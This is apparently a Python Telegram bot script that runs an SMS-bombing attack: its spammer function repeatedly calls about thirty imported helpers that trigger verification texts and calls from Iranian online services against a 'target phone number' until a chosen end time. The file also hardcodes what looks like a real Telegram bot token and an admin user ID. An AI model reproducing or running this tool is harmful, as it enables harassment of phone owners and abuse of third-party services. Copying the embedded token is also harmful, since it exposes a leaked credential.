import time
import os
import telebot
from telebot import types
from datetime import datetime, timedelta
from mongo_db import DataBaseManagerUser
import threading
from datetime import datetime, timedelta
from cafebazar_api import cafebazar_sms
from digikala_api import digikala_sms
from divar_api import divar_sms
from sheypoor_api import sheypoor_sms
from snapp_api import snapp_sms
from tapsi_api import tapsi_sms_call
from poonisha_api import poonisha_sms
from taghcheh_api import taghcheh_sms
from banikar_api import banikar_sms
from gapofilm_api import gapofilm_sms
from fitamin_api import fitamin_sms
from doctor_to_api import doctor_to_sms
from tamland_api import tamland_sms
from snapp_doctor_api import snapp_doctor_sms
from tikban_api import tikban_sms
from virgol_api import virgol_sms
from talent_coach_api import talent_coach_sms
from pezeshket_api import pezeshket_sms
from namava_api import namava_sms
from mrbilit_api import mrbilit_sms
from wisgoon_api import wisgoon_sms
from pinket_api import pinket_sms
from snapp_market_api import snapp_market_sms
from bani_mode_api import bani_mode_sms
from gap_api import gap
from ali_baba_api import ali_baba
from snapp_link_api import snapp_link_sms
from otaghak_api import otaghak_sms
from malltina_api import malltina_sms
from mobit_api import mobit_sms
from alopeyk_api import alopeyk_sms
from ostadkar_api import ostadkar_sms
from achareh_api import acharh_sms

TOKEN = "5356098699:AAHLIDFeLmFcPsAL3VisFQiYjH_I21Xs4aw"
bot = telebot.TeleBot(token=TOKEN)

admin_user_id = 1727224717


# phone_number = input("Enter target phone number (example : 9XXXXXXXXXXX) : ")
# # # schedule_time = input("Enter schedule time (example : 2022-02-02 13:00:00) : ")
# # # end_schedule_time = input("Enter end schedule time (example : 2022-02-02 13:05:30) : ")
# start_date = str(datetime.strftime((datetime.now()), "%Y-%m-%d %H:%M:%S"))
# end_date = str(datetime.strftime((datetime.now() + timedelta(minutes=1)), "%Y-%m-%d %H:%M:%S"))

def spammer(phone, end_schedule, chatid):
    try:
        end_schedule_date_time_obj = datetime.strptime("{}".format(end_schedule), "%Y-%m-%d %H:%M:%S")
        os.system('cls' if os.name == 'nt' else 'clear')
        while end_schedule_date_time_obj > datetime.now():
            cafebazar_sms(phone)
            digikala_sms(phone)
            divar_sms(phone)
            sheypoor_sms(phone)
            snapp_sms(phone)
            tapsi_sms_call(phone)
            poonisha_sms(phone)
            taghcheh_sms(phone)
            banikar_sms(phone)
            gapofilm_sms(phone)
            fitamin_sms(phone)
            doctor_to_sms(phone)
            tamland_sms(phone)
            snapp_doctor_sms(phone)
            tikban_sms(phone)
            virgol_sms(phone)
            talent_coach_sms(phone)
            pezeshket_sms(phone)
            # namava_sms(phone)
            mrbilit_sms(phone)
            wisgoon_sms(phone)
            pinket_sms(phone)
            snapp_market_sms(phone)
            bani_mode_sms(phone)
            gap(phone)
            ali_baba(phone)
            snapp_link_sms(phone)
            otaghak_sms(phone)
            malltina_sms(phone)
            mobit_sms(phone)
            alopeyk_sms(phone)
            ostadkar_sms(phone)
            acharh_sms(phone)
        bot.send_message(chatid, "Done !")
        return True
    except Exception as e:
        bot.send_message(admin_user_id, "Error : {}".format(e))
        return False
